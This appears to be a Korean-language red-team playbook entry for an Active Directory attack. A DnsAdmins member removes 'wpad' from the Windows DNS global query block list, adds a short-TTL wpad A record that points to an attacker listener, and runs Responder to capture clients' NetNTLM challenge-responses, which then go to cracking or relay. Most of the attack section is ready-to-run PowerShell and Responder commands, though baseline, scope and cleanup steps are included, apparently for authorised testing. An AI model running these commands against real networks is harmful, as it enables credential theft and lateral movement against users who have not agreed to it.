---
tags:
  - 환경/ad
  - 서비스/dns
  - 서비스/ntlm
시작조건: ["DnsAdmins 그룹이 현재 Windows token에 반영된 세션 확보", "Windows DNS Server의 zone과 WPAD 사용 가능성 확인"]
필요권한: ["대상 DNS 서버의 global query block list와 zone record를 조회·변경할 권한", "공격 호스트의 HTTP·WPAD listener와 packet capture 권한"]
필요조건: ["기존 GlobalQueryBlockList와 wpad record 기준선 파일을 쓸 전용 경로", "client가 질의할 zone과 listener IP"]
결과: ["wpad 이름의 공격 호스트 DNS 응답", "피해 client의 HTTP·WPAD 요청", "NetNTLM challenge-response 또는 relay 수신 경로 후보"]
---

# DnsAdmins WPAD DNS 레코드로 NTLM 인증 유도

## 한 줄 판단

현재 DnsAdmins token으로 Windows DNS zone을 변경할 수 있고 client의 WPAD 동작을 평가해야 한다면, 기존 block list와 `wpad` record를 보존한 채 짧은 TTL의 A record를 listener로 지정하고 DNS 응답·HTTP 요청·NetNTLM 수집·relay 후 작업을 각각 분리해 판정한다.

> `wpad` 응답과 listener는 proxy discovery 및 정상 연결에 영향을 줄 수 있고, 수집한 인증 자료는 record 삭제로 되돌릴 수 없다. 기존 block list·record·TTL을 기록하고 영향이 보이면 listener를 먼저 중지한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| DNS 관리 위치 | DnsServer PowerShell module을 실행할 Windows 관리 host와 대상 DNS server | `hostname`, `Get-DnsServerGlobalQueryBlockList -ComputerName <DNS_SERVER>` | 대상명·RPC·방화벽과 module 존재 확인 |
| 현재 계정 | DnsAdmins가 현재 token에 반영되고 대상 zone write가 실제 허용됨 | `whoami /groups`, record 조회·`-WhatIf` 결과 | 디렉터리 멤버십과 현재 token·zone ACL을 구분 |
| 기존 block list | `Enable`과 전체 `List` 값을 exact하게 기록 | `Get-DnsServerGlobalQueryBlockList` | 기존 값을 모르면 변경하지 않음 |
| 기존 WPAD record | `<ZONE_NAME>`의 `wpad` A·AAAA·CNAME 등이 없음 | `Get-DnsServerResourceRecord` | 기존 record가 있으면 덮어쓰거나 삭제하지 않고 중단 |
| listener 경로 | client에서 `<LISTENER_IP>`로 HTTP 요청이 도달하고 listener port가 비어 있음 | route·firewall·listener 기준선과 Responder analyze mode | DNS 응답 성공과 HTTP·NTLM 도달을 구분 |
| 영향 범위 | 대상 client·zone과 즉시 중지 조건 | 대상 목록과 TTL 기록 | 전사 zone으로 확대하지 않음 |

WPAD DNS 응답은 proxy discovery 후보일 뿐 자동으로 NTLM을 만들지 않는다. HTTP 요청 도달, NTLM challenge-response, 평문 복구와 relay target의 후속 권한은 [[NTLM 인증 자료, 실시간 Relay와 서비스 권한 경계]]에 따라 각각 확인한다.

## 실행

### 1. DNS와 listener 기준선 기록

`<DNS_BASELINE_PATH>`는 Windows 관리 호스트의 새 기준선 JSON 경로(예: `C:\\Temp\\wpad-baseline.json`)다. `<DNS_SERVER>`와 `<ZONE_NAME>`은 대상 서버와 DNS zone, `<LISTENER_IP>`는 Linux listener 호스트의 IPv4다. `<INTERFACE>`는 그 listener 호스트에서 앞선 네트워크 확인으로 선택한 interface다.

```powershell
whoami /groups | Select-String 'DnsAdmins'
Test-Path -LiteralPath '<DNS_BASELINE_PATH>'
$baseline = Get-DnsServerGlobalQueryBlockList -ComputerName '<DNS_SERVER>'
$baseline | Format-List Enable,List
$baseline | Select-Object Enable,List | ConvertTo-Json -Depth 3 | Set-Content -LiteralPath '<DNS_BASELINE_PATH>' -Encoding utf8
Get-DnsServerResourceRecord -ComputerName '<DNS_SERVER>' -ZoneName '<ZONE_NAME>' -Name 'wpad' -ErrorAction SilentlyContinue
Resolve-DnsName 'wpad.<ZONE_NAME>' -Server '<DNS_SERVER>' -ErrorAction SilentlyContinue
```

Linux listener host에서는 먼저 응답하지 않는 분석 모드로 interface와 기존 요청을 확인한다.

```bash
sudo responder -I <INTERFACE> -A
```

확인할 출력:

- `Test-Path`가 `False`인 새 전용 경로에 저장한 `Enable`, 전체 block `List`와 기존 `wpad` record·응답 상태. 기존 파일이 있으면 다른 경로를 사용한다.
- 기존 record가 반환되면 이 절차로 교체하거나 지우지 않는다.
- Responder analyze mode의 interface·listener 상태. 이 단계에서는 poison response나 NetNTLM을 기대하지 않는다.

### 2. block list와 WPAD record 변경

기존 list 전체를 빈 값으로 바꾸지 않고, 기록한 list에서 `wpad`만 제외한 정확한 값을 사용한다. 다른 항목은 그대로 보존한다.

`<DNS_SERVER>`·`<ZONE_NAME>`·`<LISTENER_IP>`는 1단계에서 기록한 같은 DNS server·zone·listener IPv4를 재사용한다. 이 PowerShell은 DNS 관리 호스트에서 실행하며, `$baseline`은 바로 앞 기준선 수집에서 만든 변수다.

```powershell
$newList = @($baseline.List | Where-Object { $_ -ine 'wpad' })
Set-DnsServerGlobalQueryBlockList -ComputerName '<DNS_SERVER>' -Enable $baseline.Enable -List $newList -PassThru
Add-DnsServerResourceRecordA -ComputerName '<DNS_SERVER>' -ZoneName '<ZONE_NAME>' -Name 'wpad' -IPv4Address '<LISTENER_IP>' -TimeToLive 00:05:00 -PassThru
Get-DnsServerResourceRecord -ComputerName '<DNS_SERVER>' -ZoneName '<ZONE_NAME>' -Name 'wpad'
Resolve-DnsName 'wpad.<ZONE_NAME>' -Server '<DNS_SERVER>'
```

기존 block list가 disabled 상태였으면 그 상태를 유지한다. source 예시처럼 전체 global query block list를 단순 `-Enable $false`로 바꾸면 다른 차단 이름까지 영향을 주므로 대표 절차로 사용하지 않는다.

확인할 출력:

- 새 A record의 exact IPv4와 TTL, DNS query의 `<LISTENER_IP>` 응답.
- 이 결과는 DNS 설정 변경 성공이다. client HTTP 요청이나 인증 자료 수집 성공이 아니다.

### 3. 제한된 WPAD listener에서 요청과 인증 자료 확인

분석 모드를 중지한 뒤 설치된 Responder build의 option을 확인하고 `<INTERFACE>`에서 WPAD listener를 실행한다. 이 명령은 runtime 제한 option을 사용하지 않으므로 `<RUN_MINUTES>`를 명령 입력으로 제시하지 않는다.

`<INTERFACE>`는 1단계 Analyze mode에서 같은 링크 요청을 확인한 Linux listener 호스트의 interface 이름을 그대로 사용한다.

```bash
sudo responder -h
sudo responder -I <INTERFACE> -wFv
```

정한 종료 시각, 대상 밖 요청, 사용자 인증 prompt 또는 업무 연결 이상 중 하나가 나타나면 `Ctrl+C`로 즉시 중지한다.

확인할 출력:

- `wpad.dat`·proxy 관련 HTTP 요청의 출발지와 요청 시각.
- `NTLMv1` 또는 `NTLMv2` capture가 있으면 NetNTLM challenge-response와 인증 주체를 얻은 상태다.
- DNS 응답만 있고 HTTP 요청이 없으면 WPAD client 동작·cache·proxy 정책 미충족이다. 인증 성공으로 확대하지 않는다.
- captured NetNTLM은 NT hash가 아니며 직접 Pass the Hash에 사용하지 않는다.

### 4. 결과를 cracking과 relay로 분리

- 저장한 NetNTLM을 후보 비밀번호와 대조하려면 [[오프라인 해시 크래킹]]으로 넘긴다.
- 새 인증을 실시간 relay하려면 [[NTLM Relay 조건 검토]]에서 SMB signing, EPA·CBT, listener port 충돌과 relay account의 target action 권한을 먼저 확인한다.
- Responder의 SMB·HTTP listener와 relay listener가 같은 port를 동시에 bind하지 않도록 설치된 설정을 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `wpad` DNS A 응답만 확인 | DNS 변경 성공 | WPAD client 요청 미확인 | client 정책·cache와 HTTP 도달성을 확인하고 NetNTLM로 승격하지 않음 |
| HTTP `wpad.dat` 또는 proxy 요청 도달 | client가 listener를 WPAD 경로로 사용 | 인증 유도 경로 확인 | listener의 challenge와 실제 NTLM response 확인 |
| NetNTLMv1/v2 capture | client의 challenge-response 수집 성공 | NetNTLM과 주체·출발지 단서 | [[오프라인 해시 크래킹]] 또는 [[NTLM Relay 조건 검토]] |
| relay 인증 뒤 action 거부 | 인증과 authorization이 다름 | relay session만 성립 | target service ACL·role을 확인 |
| 기존 `wpad` record 존재 | 기존 운영 설정 또는 다른 소유자 자료 | 변경 전제 미충족 | 덮어쓰지 않고 scope owner와 설정 목적 확인 |
| 업무 연결 이상·대상 밖 요청 | WPAD 변경과 listener가 정상 통신에 영향 | 운영 영향 발생 | listener 중지 후 즉시 아래 DNS 복구 수행 |

## 변경 영향과 복구

listener를 먼저 중지하고 이번 작업에서 추가한 exact A record만 제거한다. 그 뒤 작업 전 저장한 `Enable`과 전체 `List`를 복원한다.

```powershell
$baseline = Get-Content -LiteralPath '<DNS_BASELINE_PATH>' -Raw | ConvertFrom-Json
Remove-DnsServerResourceRecord -ComputerName '<DNS_SERVER>' -ZoneName '<ZONE_NAME>' -Name 'wpad' -RRType 'A' -RecordData '<LISTENER_IP>' -Force
Set-DnsServerGlobalQueryBlockList -ComputerName '<DNS_SERVER>' -Enable $baseline.Enable -List $baseline.List -PassThru
Get-DnsServerResourceRecord -ComputerName '<DNS_SERVER>' -ZoneName '<ZONE_NAME>' -Name 'wpad' -ErrorAction SilentlyContinue
Get-DnsServerGlobalQueryBlockList -ComputerName '<DNS_SERVER>' | Format-List Enable,List
Resolve-DnsName 'wpad.<ZONE_NAME>' -Server '<DNS_SERVER>' -ErrorAction SilentlyContinue
Remove-Item -LiteralPath '<DNS_BASELINE_PATH>' -Force
Test-Path -LiteralPath '<DNS_BASELINE_PATH>'
```

record query가 작업 전과 같고 block list의 `Enable`·`List`가 exact baseline과 일치한 뒤 마지막 `Test-Path`가 `False`여야 DNS 기준선 파일까지 정리된다. DNS cache에는 TTL 동안 기존 응답이 남을 수 있으므로 즉시 `NXDOMAIN`이 아니어도 server authoritative 응답과 TTL을 확인하며 client cache를 임의로 전사 flush하지 않는다.

Responder process·listener와 산출물은 [[Responder]]의 exact PID·작업 전 file boundary 기준으로 정리한다. 캡처된 인증 자료와 DNS·proxy log는 record 삭제로 되돌릴 수 없다.

## 관련 서비스

- [[DNS 서비스]]

## 관련 도구

- [[Responder]]
- [[Inveigh]]
- [[powershell]]

## 관련 상태 라우터

- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[Windows 위임 운영 그룹 확인 후 권한 경로 선택]]
- 평문을 복구했으면 [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 참고 링크

- [Microsoft Learn: Get-DnsServerGlobalQueryBlockList](https://learn.microsoft.com/powershell/module/dnsserver/get-dnsserverglobalqueryblocklist)
- [Microsoft Learn: Set-DnsServerGlobalQueryBlockList](https://learn.microsoft.com/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist)
- [Microsoft Learn: Add-DnsServerResourceRecordA](https://learn.microsoft.com/powershell/module/dnsserver/add-dnsserverresourcerecorda)
- [Microsoft Learn: Remove-DnsServerResourceRecord](https://learn.microsoft.com/powershell/module/dnsserver/remove-dnsserverresourcerecord)
